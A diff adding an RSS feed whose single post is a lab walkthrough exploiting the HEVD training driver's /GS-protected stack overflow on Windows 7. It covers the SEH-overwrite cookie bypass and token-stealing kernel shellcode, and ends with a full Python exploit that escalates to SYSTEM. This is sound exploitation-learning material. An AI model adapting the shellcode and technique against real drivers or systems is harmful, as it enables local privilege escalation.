@@ -1,0 +1,347 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Windows on klue-less thoughts</title>
+    <link>https://klue.github.io/tags/windows/</link>
+    <description>Recent content in Windows on klue-less thoughts</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Tue, 05 Sep 2017 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://klue.github.io/tags/windows/" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>HEVD Stack Overflow GS</title>
+      <link>https://klue.github.io/blog/2017/09/hevd_stack_gs/</link>
+      <pubDate>Tue, 05 Sep 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://klue.github.io/blog/2017/09/hevd_stack_gs/</guid>
+      <description>&lt;p&gt;Lately, I&#39;ve decided to play around with &lt;a href=&#34;https://github.com/hacksysteam/HackSysExtremeVulnerableDriver&#34;&gt;HackSys Extreme Vulnerable Driver
+(HEVD)&lt;/a&gt; for fun.
+It&#39;s a great way to familiarize yourself with Windows exploitation. In this
+blog post, I&#39;ll show how to exploit the stack overflow that is protected with
+&lt;a href=&#34;https://docs.microsoft.com/en-us/cpp/build/reference/gs-buffer-security-check&#34;&gt;/GS stack
+cookies&lt;/a&gt;
+on Windows 7 SP1 32 bit. You can find the &lt;a href=&#34;https://github.com/klue/hevd&#34;&gt;source code
+here&lt;/a&gt;. It has a few more exploits written and a
+Win10 pre-anniversary version of the regular stack buffer overflow
+vulnerability.&lt;/p&gt;
+
+&lt;h2 id=&#34;triggering-the-vulnerable-function&#34;&gt;Triggering the Vulnerable Function&lt;/h2&gt;
+
+&lt;p&gt;To start, we need to find the
+&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/windows/desktop/aa363219(v=vs.85).aspx&#34;&gt;ioctl&lt;/a&gt;
+dispatch routine in HEVD. Looking for the
+&lt;a href=&#34;https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-device-control&#34;&gt;&lt;code&gt;IRP_MJ_DEVICE_CONTROL&lt;/code&gt;&lt;/a&gt;
+&lt;a href=&#34;https://docs.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/i-o-request-packets&#34;&gt;IRP&lt;/a&gt;,
+we see that the dispatch function can be found at &lt;code&gt;hevd+508e&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;kd&amp;gt; !drvobj hevd 2
+Driver object (852b77f0) is for:
+ \Driver\HEVD
+DriverEntry:   995cb129	HEVD
+DriverStartIo: 00000000	
+DriverUnload:  995ca016	HEVD
+AddDevice:     00000000	
+
+Dispatch routines:
+[00] IRP_MJ_CREATE                      995c9ff2	HEVD+0x4ff2
+[01] IRP_MJ_CREATE_NAMED_PIPE           995ca064	HEVD+0x5064
+...
+[0e] IRP_MJ_DEVICE_CONTROL              995ca08e	HEVD+0x508e
+[0f] IRP_MJ_INTERNAL_DEVICE_CONTROL     995ca064	HEVD+0x5064
+[10] IRP_MJ_SHUTDOWN                    995ca064	HEVD+0x5064
+[11] IRP_MJ_LOCK_CONTROL                995ca064	HEVD+0x5064
+[12] IRP_MJ_CLEANUP                     995ca064	HEVD+0x5064
+[13] IRP_MJ_CREATE_MAILSLOT             995ca064	HEVD+0x5064
+[14] IRP_MJ_QUERY_SECURITY              995ca064	HEVD+0x5064
+[15] IRP_MJ_SET_SECURITY                995ca064	HEVD+0x5064
+...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Finding the ioctl request number requires very light reverse engineering. We
+want to end up eventually at &lt;code&gt;hevd+515a&lt;/code&gt;. At &lt;code&gt;hevd+50b4&lt;/code&gt;, the request number is
+subtracted by &lt;code&gt;222003h&lt;/code&gt;. If it was &lt;code&gt;222003h&lt;/code&gt;, then jump to &lt;code&gt;hevd+5172&lt;/code&gt;, or else
+fall through to &lt;code&gt;hevd+50bf&lt;/code&gt;. In this basic block, our ioctl request number is
+subtracted by 4. If the result is 0, we are where we want to be. Therefore, our
+ioctl number should be &lt;code&gt;222007h&lt;/code&gt;.
+&lt;figure&gt;&lt;img src=&#34;https://klue.github.io/images/hevd_stack_gs-finding_ioctl_num.png&#34; alt=&#34;Finding ioctl number&#34;&gt;&lt;/figure&gt;&lt;/p&gt;
+
+&lt;p&gt;Eventually, a &lt;code&gt;memcpy&lt;/code&gt; is reached where the calling function does not check the
+copy size.
+&lt;figure&gt;&lt;img src=&#34;https://klue.github.io/images/hevd_stack_gs-vulnerable_code.png&#34; alt=&#34;Vulnerable code&#34;&gt;&lt;/figure&gt;&lt;/p&gt;
+
+&lt;p&gt;To give the overflow code a quick run, we call it with benign input using the
+code below. You can find the implementation of &lt;code&gt;mmap&lt;/code&gt; and &lt;code&gt;write&lt;/code&gt; in the full
+source code.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def trigger_stackoverflow_gs(addr, size):
+    dwReturn = c_ulong()
+    driver_handle = kernel32.CreateFileW(DEVICE_NAME,
+                                         GENERIC_READ | GENERIC_WRITE,
+                                         0, None, OPEN_EXISTING, 0, None)
+    if not driver_handle or driver_handle == -1:
+        sys.exit()
+
+    print &amp;quot;[+] IOCTL: 0x222007&amp;quot;
+    dev_ioctl = kernel32.DeviceIoControl(driver_handle, 0x222007,
+                                         addr, size,
+                                         None, 0,
+                                         byref(dwReturn), None)
+
+m = mmap()
+write(m, &#39;A&#39;*10)
+trigger_stackoverflow_gs(m, 10)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In WinDbg, the debug output confirms that we are calling the right ioctl.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://klue.github.io/images/hevd_stack_gs-sample_run.png&#34; width=&#34;60%&#34; height=&#34;60%&#34;/&gt;&lt;/p&gt;
+
+&lt;p&gt;From the figure, we can see that the kernel buffer is 0x200 in size so if we
+run a PoC again, but with 0x250 &lt;code&gt;A&lt;/code&gt;s, we should overflow the stack cookie and
+blue screens our VM.&lt;/p&gt;
+
+&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://klue.github.io/images/hevd_stack_gs-stack_cookie_overwrite_confirmation.png&#34; alt=&#34;Overwriting stack cookie&#34;&gt;&lt;/figure&gt;&lt;/p&gt;
+
+&lt;p&gt;Indeed, the bugcheck tells us that the system crashed due to a stack buffer
+overflow. Stack cookies in Windows are first XORed with &lt;code&gt;ebp&lt;/code&gt; before they&#39;re
+stored on the stack. If we take the cookie in the bugcheck, and XOR it with
+&lt;code&gt;41414141&lt;/code&gt;, the result should resemble a stack address. Specifically, it should
+be the stack base pointer for &lt;code&gt;hevd+48da&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;kd&amp;gt; ? e9d25b91 ^ 41414141
+Evaluate expression: -1466754352 = a8931ad0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;bypassing-stack-cookies&#34;&gt;Bypassing Stack Cookies&lt;/h2&gt;
+
+&lt;p&gt;A common way to bypass stack cookies, introduced by &lt;a href=&#34;https://dl.packetstormsecurity.net/papers/bypass/defeating-w2k3-stack-protection.pdf&#34;&gt;David
+Litchfield&lt;/a&gt;,
+is to cause the program to throw an exception before the stack cookie is
+checked at the end of the function. This works because when an exception
+occurs, the stack cookie is not checked.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;There are two ways [generating an exception] might happen--one we can control
+and the other is dependent of the code of the vulnerable function. In the
+latter case, if we overflow other data, for example parameters that were
+pushed onto the stack to the vulnerable function and these are referenced
+before the cookie check is performed then we could cause an exception here by
+setting this data to something that will cause an exception. If the code of
+the vulnerable function has been written in such a way that no opportunity
+exists to do this, then we have to attempt to generate our own exception. We
+can do this by attempting to write beyond the end of the stack.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;For us, it&#39;s easy because the vulnerable function uses &lt;code&gt;memcpy&lt;/code&gt;. We can simply
+force &lt;code&gt;memcpy&lt;/code&gt; to segfault by letting it continue copying the source buffer all
+the way to unmapped memory.&lt;/p&gt;
+
+&lt;p&gt;I use my &lt;code&gt;mmap&lt;/code&gt; function to map two adjacent pages, then &lt;code&gt;munmap&lt;/code&gt; to unmap the
+second page. &lt;code&gt;mmap&lt;/code&gt; and &lt;code&gt;munmap&lt;/code&gt; are just simple wrappers I wrote for
+&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/windows/hardware/ff566416(v=vs.85).aspx&#34;&gt;&lt;code&gt;NtAllocateVirtualMemory&lt;/code&gt;&lt;/a&gt;
+and
+&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/windows/hardware/ff566460(v=vs.85).aspx&#34;&gt;&lt;code&gt;NtFreeVirtualMemory&lt;/code&gt;&lt;/a&gt;
+respectively. The idea is to place the source buffer at the end of the mapped
+page that was mapped, and have the vulnerable &lt;code&gt;memcpy&lt;/code&gt; read off into the
+unmapped page to cause an exception.&lt;/p&gt;
+
+&lt;p&gt;To test this, we&#39;ll use the PoC code below.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;m = mmap(size=0x2000)
+munmap(m+0x1000)
+
+trigger_stackoverflow_gs(m+0x1000-0x250, 0x251)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Back in the debugger, we can observe that an exception was thrown and &lt;code&gt;eip&lt;/code&gt; was
+overwritten as a result of the exception handler being overwritten.
+&lt;figure&gt;&lt;img src=&#34;https://klue.github.io/images/hevd_stack_gs-exception_handler_overwrite_confirmation.png&#34; alt=&#34;Exception handler crash&#34;&gt;&lt;/figure&gt;&lt;/p&gt;
+
+&lt;p&gt;The next step is to find the offset of the &lt;code&gt;A&lt;/code&gt;s so we can control &lt;code&gt;eip&lt;/code&gt; to
+point to shellcode. You can use a binary search type way to find the offset,
+but an easier method is to use a &lt;a href=&#34;https://en.wikipedia.org/wiki/De_Bruijn_sequence&#34;&gt;De Bruijn
+sequence&lt;/a&gt; as the payload. I
+usually use Metasploit&#39;s
+&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_create.rb&#34;&gt;&lt;code&gt;pattern_create.rb&lt;/code&gt;&lt;/a&gt;
+and
+&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb&#34;&gt;&lt;code&gt;pattern_offset.rb&lt;/code&gt;&lt;/a&gt;
+for finding the exact offset in my buffer.&lt;/p&gt;
+
+&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://klue.github.io/images/hevd_stack_gs-pattern_create_crash.png&#34; alt=&#34;Exception handler crash patter_create.rb&#34;&gt;&lt;/figure&gt;&lt;/p&gt;
+
+&lt;p&gt;The figure above shows us &lt;code&gt;41367241&lt;/code&gt; overwrites the exception handler address
+and so also &lt;code&gt;eip&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;kd&amp;gt; .formats 41367241
+Evaluate expression:
+  Hex:     41367241
+  Decimal: 1094087233
+  Octal:   10115471101
+  Binary:  01000001 00110110 01110010 01000001
+  Chars:   A6rA
+  Time:    Wed Sep  1 18:07:13 2004
+  Float:   low 11.4029 high 0
+  Double:  5.40551e-315
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Reversing the order due to endianness, we get &lt;code&gt;Ar6A&lt;/code&gt; which &lt;code&gt;pattern_offset.rb&lt;/code&gt;
+tells us is offset 528 (0x210). Therefore, our source buffer will be of size
+0x210+4, where the 4 is due to the address of our shellcode.&lt;/p&gt;
+
+&lt;h2 id=&#34;constructing-shellcode&#34;&gt;Constructing Shellcode&lt;/h2&gt;
+
+&lt;p&gt;Since there is 0x1000-0x210-4 unused space in our allocated page, we can just
+put our shellcode in the beginning of the page. I use common Windows token
+stealing shellcode that basically iterates through the &lt;code&gt;_EPROCESS&lt;/code&gt;s, looks for
+the SYSTEM process, and copies the SYSTEM process&#39; token. Additionally, for
+convenience in breaking at the shellcode, I prepend the shellcode with a
+breakpoint (&lt;code&gt;\xcc&lt;/code&gt;).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;\xcc\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89\xc1\x8b\x80\xb8\x00
+\x00\x00\x2d\xb8\x00\x00\x00\x83\xb8\xb4\x00\x00\x00\x04\x75\xec\x8b\x90\xf8
+\x00\x00\x00\x89\x91\xf8\x00\x00\x00
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Our shellcode still isn&#39;t complete yet; the shellcode doesn&#39;t know where to
+return to after it executes. To search for a return address, let&#39;s inspect the
+call stack in the debugger when the shellcode executes.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;kd&amp;gt; k
+ # ChildEBP RetAddr
+WARNING: Frame IP not in any known module. Following frames may be wrong.
+00 a88cf114 82ab3622 0x1540000
+01 a88cf138 82ab35f4 nt!ExecuteHandler2+0x26
+02 a88cf15c 82ae73b5 nt!ExecuteHandler+0x24
+03 a88cf1f0 82af005c nt!RtlDispatchException+0xb6
+04 a88cf77c 82a79dd6 nt!KiDispatchException+0x17c
+05 a88cf7e4 82a79d8a nt!CommonDispatchException+0x4a
+06 a88cf868 995c9969 nt!KiExceptionExit+0x192
+07 a88cf86c a88cf8b4 HEVD+0x4969
+08 a88cf870 01540dec 0xa88cf8b4
+09 a88cf8b4 41414141 0x1540dec
+0a a88cf8b8 41414141 0x41414141
+0b a88cf8bc 41414141 0x41414141
+...
+51 a88cfad0 995c99ca 0x41414141
+52 a88cfae0 995ca16d HEVD+0x49ca
+53 a88cfafc 82a72593 HEVD+0x516d
+54 a88cfb14 82c6699f nt!IofCallDriver+0x63
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;hevd+4969&lt;/code&gt; is the instruction address after the &lt;code&gt;memcpy&lt;/code&gt;, but we can&#39;t return
+here because the portion of stack the remaining code uses  is corrupted. Fixing
+the stack to the correct values would be extremely annoying. Instead, returning
+to &lt;code&gt;hevd+49ca&lt;/code&gt; which is the return address of the stack frame right below
+&lt;code&gt;hevd+4969&lt;/code&gt; makes more sense.&lt;/p&gt;
+
+&lt;p&gt;However, if you adjust the stack and return to &lt;code&gt;hevd+49ca&lt;/code&gt;, you&#39;ll still get a
+crash. The problem is at &lt;code&gt;hevd+5260&lt;/code&gt; where &lt;code&gt;edi+0x1c&lt;/code&gt; is dereferenced. &lt;code&gt;edi&lt;/code&gt; at
+this point is 0 because registers are XORed with themselves before the
+exception handler assumes control and neither the program nor our shellcode
+touched &lt;code&gt;edi&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;center&gt;
+&lt;img src=&#34;https://klue.github.io/images/hevd_stack_gs-__SEH_epilog4.png&#34; width=&#34;40%&#34; height=&#34;40%&#34;/&gt;
+&lt;/center&gt;&lt;/p&gt;
+
+&lt;p&gt;In a normal execution, &lt;code&gt;edi&lt;/code&gt; and other registers are restored in
+&lt;code&gt;__SEH_epilog4&lt;/code&gt;. These values are of course restored from the stack. Taking
+&lt;code&gt;a88cf86c&lt;/code&gt; from the stack trace before, we can dump and attempt to find the
+restore values. They&#39;re actually are quite easy to find here because
+&lt;code&gt;hevd+5dcc&lt;/code&gt; is quite easy to spot. &lt;code&gt;hevd+5dcc&lt;/code&gt; is the address of the debug
+print string which is restored into &lt;code&gt;ebx&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;kd&amp;gt; dds a88cf86c
+a88cf86c  995c9969 HEVD+0x4969
+a88cf870  a88cf8b4
+a88cf874  01540dec
+a88cf878  00000218
+a88cf87c  995ca760 HEVD+0x5760
+a88cf880  995ca31a HEVD+0x531a
+a88cf884  00000200
+a88cf888  995ca338 HEVD+0x5338
+a88cf88c  a88cf8b4
+a88cf890  995ca3a2 HEVD+0x53a2
+a88cf894  00000218
+a88cf898  995ca3be HEVD+0x53be
+a88cf89c  01540dec
+a88cf8a0  31d15d0b
+a88cf8a4  8c843f68 &amp;lt;-- edi
+a88cf8a8  8c843fd8 &amp;lt;-- esi
+a88cf8ac  995cadcc HEVD+0x5dcc &amp;lt;-- ebx
+a88cf8b0  455f5359
+a88cf8b4  41414141
+a88cf8b8  41414141
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;To obtain the offset of &lt;code&gt;edi&lt;/code&gt;, just subtract &lt;code&gt;esp&lt;/code&gt; from the current address of
+the restore value.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;kd&amp;gt; ? a88cf8a4 - esp
+Evaluate expression: 1932 = 0000078c
+kd&amp;gt; dds a88cfad0 la
+a88cfad0  a88cfae0
+a88cfad4  995c99ca HEVD+0x49ca
+a88cfad8  01540dec
+a88cfadc  00000218
+a88cfae0  a88cfafc
+a88cfae4  995ca16d HEVD+0x516d
+a88cfae8  8c843f68
+a88cfaec  8c843fd8
+a88cfaf0  86c3c398
+a88cfaf4  8586f5f0
+kd&amp;gt; ? a88cfad0 - esp
+Evaluate expression: 2488 = 000009b8
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Similarly, finding the offset to return to is found by obtaining the difference
+of &lt;code&gt;a88cfad0&lt;/code&gt; and &lt;code&gt;esp&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Lastly, our shellcode should &lt;code&gt;pop ebp; ret 8;&lt;/code&gt; which results in&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;start:
+  xor eax, eax;
+  mov eax,dword ptr fs:[eax+0x124]; # nt!_KPCR.PcrbData.CurrentThread
+  mov eax,dword ptr [eax+0x50];     # nt!_KTHREAD.ApcState.Process
+  mov ecx,eax;                      # Store unprivileged _EPROCESS in ecx
+loop:
+  mov eax,dword ptr [eax+0xb8];     # Next nt!_EPROCESS.ActiveProcessLinks.Flink
+  sub eax, 0xb8;                    # Back to the beginning of _EPROCESS
+  cmp dword ptr [eax+0xb4],0x04;    # SYSTEM process? nt!_EPROCESS.UniqueProcessId
+  jne loop;
+stealtoken:
+  mov edx,dword ptr [eax+0xf8];     # Get SYSTEM nt!_EPROCESS.Token
+  mov dword ptr [ecx+0xf8],edx;     # Copy token
+restore:
+  mov edi, [esp+0x78c];             # edi irq
+  mov esi, [esp+0x790];             # esi
+  mov ebx, [esp+0x794];             # move print string into ebx
+  add esp, 0x9b8;
+  pop ebp;
+  ret 0x8;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;gaining-nt-authoritysystem&#34;&gt;Gaining NT Authority\SYSTEM&lt;/h2&gt;
+
+&lt;p&gt;Putting everything together, the final exploit looks like this.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;m = mmap(size=0x2000)
+munmap(m+0x1000)
+size = 0x210+4
+
+sc = &#39;\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89\xc1\x8b\x80\xb8\x00\x00\x00\x2d\xb8\x00\x00\x00\x83\xb8\xb4\x00\x00\x00\x04\x75\xec\x8b\x90\xf8\x00\x00\x00\x89\x91\xf8\x00\x00\x00\x8b\xbc\x24\x8c\x07\x00\x00\x8b\xb4\x24\x90\x07\x00\x00\x8b\x9c\x24\x94\x07\x00\x00\x81\xc4\xb8\x09\x00\x00\x5d\xc2\x08\x00&#39;
+write(m, sc + &#39;A&#39;*(0x1000-4-len(sc)) + struct.pack(&amp;quot;&amp;lt;I&amp;quot;, m))
+trigger_stackoverflow_gs(m+0x1000-size, size+1)
+
+print &#39;\n[+] Privilege Escalated\n&#39;
+os.system(&#39;cmd.exe&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And that should give us:
+&lt;figure&gt;&lt;img src=&#34;https://klue.github.io/images/hevd_stack_gs-priv_esc.png&#34; alt=&#34;nt authority\system&#34;&gt;&lt;/figure&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
